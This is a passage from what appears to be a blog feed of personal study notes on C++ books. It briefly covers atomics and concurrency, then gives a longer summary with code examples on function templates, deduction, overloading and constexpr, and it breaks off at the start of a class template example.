place.\<br>This requirement means that certain kinds of speculative execution ain’t permitted, because once a thread has seen a particular entry in the modification order, subsequent reads from that thread must return laster values, and subsequent writes from that thread to that object must occur laster in the modification order.</p><h2 id="5-2-Atomic-operations-and-types-in-C"><a href="#5-2-Atomic-operations-and-types-in-C" class="headerlink" title="5.2 - Atomic operations and types in C++"></a>5.2 - Atomic operations and types in C++</h2><p>An <strong>atomic operation</strong> is an indivisible operation. You can’t observe such an operation half-done from any thread in the system; it’s either done or not done.</p><p>If the load operation that reads the value of an object is <strong>atomic</strong>, and all modifications to that object are also <strong>atomic</strong>.</p><p>The flip side of this is that a non-atomic operation might be seen as half-done by another thread. If the non-atomic operation is composed of atomic operaitons (for example, assignment to <code>struct</code> with <code>atomic</code> members), then other threads may observe some sbuset of the constituent atomic operation as complete, but others as not yet started, so you might observe or end up with a value that is a mixed-up combination<br>of the various values stored.</p><h3 id="The-standard-atomic-types"><a href="#The-standard-atomic-types" class="headerlink" title="The standard atomic types"></a>The standard atomic types</h3><p>The standar <strong>atomic types</strong> can be found in the <code>&lt;atomic&gt;</code> header. All operations on such types are atomic, and only operations on these types are atomic in the sense of the language definition, although you can use mutexes to make other operation <strong>appear</strong> atomic.</p><h1 id="Chapter-6-Designing-lock-based-concurrent-data-structures"><a href="#Chapter-6-Designing-lock-based-concurrent-data-structures" class="headerlink" title="Chapter.6 - Designing lock-based concurrent data structures"></a>Chapter.6 - Designing lock-based concurrent data structures</h1><h1 id="Chapter-7-Designing-lock-free-concurrent-data-structures"><a href="#Chapter-7-Designing-lock-free-concurrent-data-structures" class="headerlink" title="Chapter.7 - Designing lock-free concurrent data structures."></a>Chapter.7 - Designing lock-free concurrent data structures.</h1><h1 id="Chapter-8-Designing-concurrent-code"><a href="#Chapter-8-Designing-concurrent-code" class="headerlink" title="Chapter.8 - Designing concurrent code"></a>Chapter.8 - Designing concurrent code</h1><h1 id="Chapter-10-Advanced-thread-management"><a href="#Chapter-10-Advanced-thread-management" class="headerlink" title="Chapter.10 - Advanced thread management"></a>Chapter.10 - Advanced thread management</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-Libro&quot;&gt;&lt;a href=&quot;#El-Libro&quot; class=&quot;headerlink&quot; title=&quot;El Libro&quot;&gt;&lt;/a&gt;El Libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Study" scheme="http://example.com/tags/Study/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Programming" scheme="http://example.com/tags/Programming/"/>
    
    <category term="C++" scheme="http://example.com/tags/C/"/>
    
    <category term="Coding" scheme="http://example.com/tags/Coding/"/>
    
    <category term="Concurrency" scheme="http://example.com/tags/Concurrency/"/>
    
  </entry>
  
  <entry>
    <title>[Book] C++ Templates - The Complete Guide (Second Edition)</title>
    <link href="http://example.com/2026/01/07/2026-1-7-CppTemplatesTheCompleteGuide2ed/"/>
    <id>http://example.com/2026/01/07/2026-1-7-CppTemplatesTheCompleteGuide2ed/</id>
    <published>2026-01-07T06:38:34.000Z</published>
    <updated>2026-01-15T09:22:53.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/CppTemplate/libro.png'><img src="/images/books/CppTemplate/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “C++ Templates - The Complete Guide (Second Edition)”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-1-Function-Templates"><a href="#Chapter-1-Function-Templates" class="headerlink" title="Chapter.1 - Function Templates"></a>Chapter.1 - Function Templates</h1><h2 id="1-1-Function-Templates"><a href="#1-1-Function-Templates" class="headerlink" title="1.1 - Function Templates"></a>1.1 - Function Templates</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>T max(T a, T b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><p>template parameters must be announced with syntax of the following form:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;comma-separated-list of parameters&gt;<br></code></pre></td></tr></table></figure><br>Here, the type parameter is <strong>T</strong>. You can use any identifier as a parameter name, but using <strong>T</strong> is the convention. The type parameter represents an arbitrary type that is determined by the caller when the caller calls the function.</p><p>For historical reasons, you can also use the keyworkd <em>class</em> instead of <em>typename</em> to define a type parameter.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;class T&gt;<br>T max(T a, T b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><br>Semantically there is no difference. However, because this use of <em>class</em> can be misleading(not only class types can be substituted for <strong>T</strong>), you should prefer the use of <em>typename</em> in this context.<br>The keyword <em>struct</em> cannot be used in place of <em>typename</em> when declaring type parameters.</p><p>Example of using max() function template:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;iostream&gt;<br>#include &lt;string&gt;<br>#include &quot;max1.hpp&quot;<br><br>int main()<br>&#123;<br>  int i = 42;<br>  std::cout &lt;&lt; &quot;max(7, i): &quot; &lt;&lt; ::max(7, i) &lt;&lt; std::endl;<br><br>  double f1 = 3.4;<br>  double f2 = -6.7;<br>  std::cout &lt;&lt; &quot;max(f1, f2): &quot; &lt;&lt; ::max(f1, f2) &lt;&lt; std::endl;<br><br>  std::string s1 = &quot;mathematics&quot;;<br>  std::string s2 = &quot;math&quot;;<br>  std::cout &lt;&lt; &quot;max(s1, s2): &quot; &lt;&lt; ::max(s1, s2) &lt;&lt; std::endl;<br>&#125;<br></code></pre></td></tr></table></figure><br>Output:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">max(7,i): 42<br>max(f1,f2): 3.4<br>max(s1,s2): mathematics<br></code></pre></td></tr></table></figure><br>Note that each call of the <em>max()</em> template is qualified with <em><strong>::</strong></em>. This is to ensure that our <em>max()</em> template is found in the global namespace. This is also a <em>std::max()</em> template in the standard libaray, which under some circumstances may be called or maylead to ambiguity.</p><p><em>void</em> is a valid template argument provided the resulting code is valid:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>T foo(T*)<br>&#123;<br><br>&#125;<br><br>void *vp = nullptr;<br>foo(vp); //OK<br>//foo(void*); NOT OK<br></code></pre></td></tr></table></figure></p><h3 id="Two-Phase-Translation"><a href="#Two-Phase-Translation" class="headerlink" title="Two-Phase Translation"></a>Two-Phase Translation</h3><p>An attempt to instantiate a template for a type that doesn’t support all the operations used within it will result in a compile-time error:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::complex&lt;flat&gt; c1, c2; //doesn&#x27;t provide operator &lt;<br>...<br>::max(c1, c2);<br></code></pre></td></tr></table></figure><br>templates are <strong>compiled</strong> in two phase:</p><ol><li>Without instantiation at <strong>definition time</strong>, the template code itself is checked for correctness ignoring the template parameters:<ol><li>Syntax errors.</li><li>Using unknown names.</li><li>Static assertions that don’t depend on template parameters are checked.</li></ol></li><li>At <em>instantiation time</em>, the template code is checked(again) to ensure that all code is valid.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>void foo(T t)<br>&#123;<br>  undeclared(); // first-phase compile-time error if undeclared() unknown<br>  undeclared(t); // second-phase compile-time error if undeclared(T) unknown<br>  static_assert(sizeof(int) &gt; 10, // always fails if sizeof(int)&lt;=10 &quot;int too small&quot;);<br>  static_assert(sizeof(T) &gt; 10, //fails if instantiated for T with size &lt;=10 &quot;T too small&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-Template-Arugment-Deduction"><a href="#1-2-Template-Arugment-Deduction" class="headerlink" title="1.2 - Template Arugment Deduction"></a>1.2 - Template Arugment Deduction</h2><p>Automatic type conversions are limited during type deduction:</p><ul><li>When declaring call parameters by reference, even trivial conversions do not apply to type deduction. Two arguments declared with the same template parameter T <strong>must match exactly</strong>.</li><li>When declaring call parameters by value, only trivial conversions that <em>decay</em> are supported: Qualifications with <strong>const</strong> or <strong>volatile</strong> are ignored, references convert to the referenced type, and raw arrays or functions convert to the corresponding pointer type.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>T max (T a, T b);<br>… <br>int const c = 42;<br>max(i, c); // OK: T is deduced as int<br>max(c, c); // OK: T is deduced as int<br>int&amp; ir = i;<br>max(i, ir); // OK: T is deduced as int<br>int arr[4];<br>foo(&amp;i, arr); // OK: T is deduced as int*<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">max(4, 7.2); //ERROR: T can be deduced as int or double<br>std::string s;<br>foo(&quot;Hello&quot;, s); //ERROR: T can be deduced as char const[6] or std::string<br></code></pre></td></tr></table></figure><p>There are three ways to handle such errors:</p><ol><li>Cast the arguments so that they both match:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">max(static_cast&lt;double&gt;(4), 7.2);<br></code></pre></td></tr></table></figure></li><li>Specify(or qualify) explicity the type of <strong>T</strong> to prevent the compiler from attempting type deduction:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">max&lt;double&gt;(4, 7.2);<br></code></pre></td></tr></table></figure></li><li>Specify that the parameters may have different types.</li></ol><p>Type Deduction for Default Arguments<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>void f(T = &quot;&quot;);<br><br>f(1); //OK: deduced T to be int, so that it calls f&lt;int&gt;(1)<br>f(); //ERROR: cannot deduce T<br></code></pre></td></tr></table></figure><br>To support this case:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T = std::string&gt;<br>void f(T = &quot;&quot;);<br>...<br><br>f(); //OK<br></code></pre></td></tr></table></figure></p><blockquote><p>Important: <strong>Template argument deduction is performed before default arguments are considered</strong>.</p></blockquote><h2 id="1-3-Multiple-Template-Parameters"><a href="#1-3-Multiple-Template-Parameters" class="headerlink" title="1.3 - Multiple Template Parameters"></a>1.3 - Multiple Template Parameters</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>T1 max (T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b; <br>&#125;<br>… <br>auto m = ::max(4, 7.2); // OK, but type of first argument defines return type<br></code></pre></td></tr></table></figure><h3 id="Template-Parameters-for-Return-Types"><a href="#Template-Parameters-for-Return-Types" class="headerlink" title="Template Parameters for Return Types"></a>Template Parameters for Return Types</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2, typename RT&gt;<br>RT max (T1 a, T2 b);<br></code></pre></td></tr></table></figure><p>However, template argument deduction does not take return types into account, and <strong>RT</strong> does not appear in the types of the function call parameters. Therefore, <strong>RT</strong> cannot be deduced.</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2, typename RT&gt;<br>RT max (T1 a, T2 b);<br>…<br>::max&lt;int,double,double&gt;(4, 7.2); // OK, but tedious<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename RT, typename T1, typename T2&gt;<br>RT max (T1 a, T2 b);<br>…<br>::max&lt;double&gt;(4, 7.2) //OK: return type is double, T1 and T2 are deduced<br></code></pre></td></tr></table></figure><h3 id="Deducing-the-Return-Type"><a href="#Deducing-the-Return-Type" class="headerlink" title="Deducing the Return Type"></a>Deducing the Return Type</h3><p>Since C++14, this is possible by simply not declaring any return type(you still have to declare the return type to be <strong>auto</strong>):<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>auto max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>Before C++14, it is only possible to let the compiler determine the return type by more or less making the implementation of the function part of its declaration. In C++11 we can benefit from the fact that the trailing return type syntax allows us to use the call parameters. That is, we can declare that the return type is derived from what operator?: yields:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>auto max(T1 a, T2 b) -&gt; decltype(b &lt; a ? a : b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>auto max(T1 a, T2 b) -&gt; decltype(b&lt;a?:a:b);<br></code></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;type_traits&gt;<br>template&lt;typename T1, typename T2&gt;<br>auto max(T1 a, T2 b) -&gt; typename std::decay&lt;decltype(true ? a : b)&gt;::type<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="1-4-Default-Template-Arguments"><a href="#1-4-Default-Template-Arguments" class="headerlink" title="1.4 - Default Template Arguments"></a>1.4 - Default Template Arguments</h2><p>You can also define values for template parameters. These values are called <strong>default template arguments</strong> and can be used with any kind of template.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;type_traits&gt;<br>template&lt;typename T1, typename T2, typename RT = std::decay_t&lt;decltype(trye ? T1() : T2())&gt;&gt;<br>RT max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><p>Note again the usage of <code>std::decay_t&lt;&gt;</code> to ensure that no reference cna be returned.</p><p>Note also that this implementation requires that we are able to call default constructors for the passed types. There is another solution, using <code>std::declval</code>, which, however, <strong>make the declaration even more complicated</strong>(Section 11.2.3)</p><p>We can also use the <code>std::common_type&lt;&gt;</code> type trait to specify the default value for the return type:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;type_traits&gt;<br><br>template&lt;typename T1, typename T2, typename RT = std::common_type_t&lt;T1, T2&gt;&gt;<br>RT max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>auto a = ::max(4, 7.2);<br>auto b = ::max&lt;double, int, long double&gt;(7.2, 4);<br></code></pre></td></tr></table></figure><br>However, again we have the problem that we have to specify three types to be able to specify the return type only.  </p><p>We would need the ability to have the return type as the first template parameter, while still begin able to deduce it from the argument types.  </p><p>It is possible to have default arguments for leading function template parameters even if parameters without default arguments follow:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename RT = long, typename T1, typename T2&gt;<br>RT max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>int i;<br>long l;<br>...<br>max(i, l); //returns long(default argument of template parameter for returns type).<br>max&lt;int&gt;(4, 42); //returns int as explicitly requested<br></code></pre></td></tr></table></figure></p><h2 id="1-5-Overloading-Function-Templates"><a href="#1-5-Overloading-Function-Templates" class="headerlink" title="1.5 - Overloading Function Templates"></a>1.5 - Overloading Function Templates</h2><p>Like ordinary functions, function templates can be overloaded. That is, you can have different function difinitions with the same function name so that when that name is used in a function call, a C++ compiler must decide which one of the various candidates to call.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//maximum of two int values:<br>int max(int a, int b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>//maximum of two values of any type:<br>template&lt;typename T&gt;<br>T max(T a, T b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>int main()<br>&#123;<br>  ::max(7, 42); // calls the nontemplate for two ints<br>  ::max(7.0, 42.0); // calls max&lt;double&gt; (by argument deduction)<br>  ::max(&#x27;a&#x27;, &#x27;b&#x27;); // calls max&lt;char&gt; (by argument deduction)<br>  ::max&lt;&gt;(7, 42); // calls max&lt;int&gt; (by argument deduction)<br>  ::max&lt;double&gt;(7, 42); // calls max&lt;double&gt; (no argument deduction)<br>  ::max(&#x27;a&#x27;, 42.7); // calls the nontemplate for two ints<br>&#125;<br></code></pre></td></tr></table></figure><p>If the template can generate a function with a better match, however, <strong>then the template is selected</strong>.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">::max(7.0, 42.0); // calls the max&lt;double&gt; (by argument deduction)<br>::max(&#x27;a&#x27;, &#x27;b&#x27;); // calls the max&lt;char&gt; (by argument deduction)<br></code></pre></td></tr></table></figure><br>Here, the template is a better match because <strong>no conversion from double or char to int is required</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">::max(&#x27;a&#x27;, 42.7);<br></code></pre></td></tr></table></figure><p>Because automatic type conversion is not considered for deduced template parameters but is considered for ordinary function parameters, the last call uses the nontemplate function(while <code>a</code> and <code>42.7</code> both converted to <code>int</code>).</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>auto max (T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br>template&lt;typename RT, typename T1, typename T2&gt;<br>RT max (T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><p>New, we can call <code>max()</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auto a = ::max(4, 7.2); //uses first template.<br>auto b = ::max&lt;long double&gt;(7.2, 4); //uses second template, since the number of parameters is not matched for first template.<br>auto c = ::max&lt;int&gt;(4, 7.2); //ERROR: both function templates match.<br></code></pre></td></tr></table></figure></p><hr><p>A useful example would be to overload the maximum template for pointers and ordinary C-strings:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;cstring&gt;<br>#include &lt;string&gt;<br><br>//maximum of two values of any type:<br>template&lt;typename T&gt;<br>T max(T a, T b)<br>&#123;<br>  return b &lt; a ? a : bl<br>&#125;<br><br>//maximum of two pointers:<br>template&lt;typename T&gt;<br>T* max(T *a, T *b)<br>&#123;<br>  return *b &lt; *a ? a : b;<br>&#125;<br><br>//maximum of two C-strings:<br>char const* max(char const* a, char const* b)<br>&#123;<br>  return std::strcmp(b, a) &lt; 0 ? a : b;<br>&#125;<br><br>int main()<br>&#123;<br>  int a = 7;<br>  int b = 42;<br>  auto m1 = ::max(a,b); // max() for two values of type int<br>  std::string s1 = &quot;hey&quot;;<br>  std::string s2 = &quot;you&quot;;<br>  auto m2 = ::max(s1,s2); // max() for two values of type std::string<br>  int* p1 = &amp;b;<br>  int* p2 = &amp;a;<br>  auto m3 = ::max(p1,p2); // max() for two pointers<br>  char const* x = &quot;hello&quot;;<br>  char const* y = &quot;world&quot;;<br>  auto m4 = ::max(x,y); // max() for two C-strings<br>&#125;<br></code></pre></td></tr></table></figure><br>Note that in all overloads of <code>max()</code> we pass the arguments by value. In general, it is good idea not to change more than necessary when overloading function templates. You should limit your changes to the number of parameters or to specifying template parameters explicitly. Otherwise, unexpected effects may happen.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;iostream&gt;<br><br>template&lt;typename T&gt;<br>T max(T a, T b)<br>&#123;<br>  std::cout &lt;&lt; &quot;max&lt;&gt;()&quot; &lt;&lt; endl;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>// maximum of three values of any type:<br>template&lt;typename T&gt;<br>T max (T a, T b, T c)<br>&#123;<br>  return max (max(a,b), c); // uses the template version even for ints<br>&#125; // because the following declaration comes<br>  // too late:<br><br>// maximum of two int values:<br>int max (int a, int b)<br>&#123;<br>  std::cout &lt;&lt; &quot;max(int,int) \n&quot;;<br>  return b &lt; a ? a : b;<br>&#125;<br>int main()<br>&#123;<br>  ::max(47,11,33); // OOPS: uses max&lt;T&gt;() instead of max(int,int)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-6-But-Shouldn’t-We…"><a href="#1-6-But-Shouldn’t-We…" class="headerlink" title="1.6 - But, Shouldn’t We…?"></a>1.6 - But, Shouldn’t We…?</h2><h3 id="Pass-by-Value-or-by-Reference"><a href="#Pass-by-Value-or-by-Reference" class="headerlink" title="Pass by Value or by Reference?"></a>Pass by Value or by Reference?</h3><h3 id="Why-not-inline"><a href="#Why-not-inline" class="headerlink" title="Why not inline?"></a>Why not inline?</h3><p>In general, function templates don’t have to be declared with inline. Unlike ordinary.<br>The only exception to this rule are full specializations of templates for specific types, so that the resulting code is no longer generic (all template parameters are defined).</p><h3 id="Why-not-constexpr"><a href="#Why-not-constexpr" class="headerlink" title="Why not constexpr?"></a>Why not constexpr?</h3><p>Since C++11, you can use constexpr to provide the ability to use code to compute some values at compile time. For a lost of templates this makes sense.</p><p>For example, to be able to use the maximum function at compile time, you have to declare it as follows:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>constexpr auto max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><br>With this, you can use the maximum function template in places with compile-time context, such as when declaring the size of a raw array:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int a[::max(sizeof(char), 1000u)];<br></code></pre></td></tr></table></figure><br>or the size of a <code>std::array&lt;&gt;</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::array&lt;std::string, ::max(sizeof(char), 1000u)&gt; arr;<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-2-Class-Template"><a href="#Chapter-2-Class-Template" class="headerlink" title="Chapter.2 - Class Template"></a>Chapter.2 - Class Template</h1><h2 id="2-1-Implementation-of-Class-Template-Stack"><a href="#2-1-Implementation-of-Class-Template-Stack" class="headerlink" title="2.1 - Implementation of Class Template Stack"></a>2.1 - Implementation of Class Template Stack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 